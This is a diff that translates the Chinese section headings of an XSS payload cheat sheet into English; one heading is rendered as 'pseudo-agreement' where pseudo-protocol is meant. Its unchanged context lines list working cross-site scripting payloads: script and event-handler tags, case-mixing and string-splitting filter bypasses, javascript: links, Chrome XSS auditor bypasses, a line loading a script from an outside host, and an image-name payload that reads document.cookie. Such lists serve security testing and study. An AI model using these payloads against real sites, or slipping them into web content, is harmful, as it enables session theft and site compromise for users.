@@ -1,7 +1,7 @@
 Payload
 ================================
 
-常用
+Commonly used
 ---------------------------------------------------
 
 - ``<script>alert(/xss/)</script>``
@@ -14,7 +14,7 @@ Payload
 - ``<details open ontoggle=alert(document.domain)>``
 - ``<embed src=javascript:alert(document.domain)>``
 
-大小写绕过
+Case bypass
 ---------------------------------------------------
 
 - ``<script>alert(1)</script>``
@@ -31,7 +31,7 @@ Payload
 - ``<mArQuEe OnScRoLl=alert(1)>``
 - ``<MaRqUeE oNsCrOlL=alert(1)>``
 
-各种alert
+Various alerts
 ---------------------------------------------------
 
 - ``<script>alert(1)</script>``
@@ -48,7 +48,7 @@ Payload
 - ``<script>top[/al/.source+/ert/.source](1)</script>``
 - ``<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>``
 
-伪协议
+pseudo-agreement
 ---------------------------------------------------
 
 - ``<a href=javascript:/0/,alert(%22M%22)>M</a>``
@@ -64,7 +64,7 @@ Chrome XSS auditor bypass
 - ``<base href=javascript:/M/><a href=,alert(1)>M</a>``
 - ``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``
 
-长度限制
+length limit
 ---------------------------------------------------
 
 :: 
@@ -77,14 +77,14 @@ jquery sourceMappingURL
 ---------------------------------------------------
     ``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``
 
-图片名
+Picture name
 ---------------------------------------------------
     ``"><img src=x onerror=alert(document.cookie)>.gif``
 
-过期的payload
+Expired payload
 ---------------------------------------------------
-- src=javascript:alert基本不可以用
-- css expression特性只在旧版本ie可用
+- src=javascript:alert is basically unusable
+- The css expression feature is only available in older versions of IE
 
 css
 ---------------------------------------------------
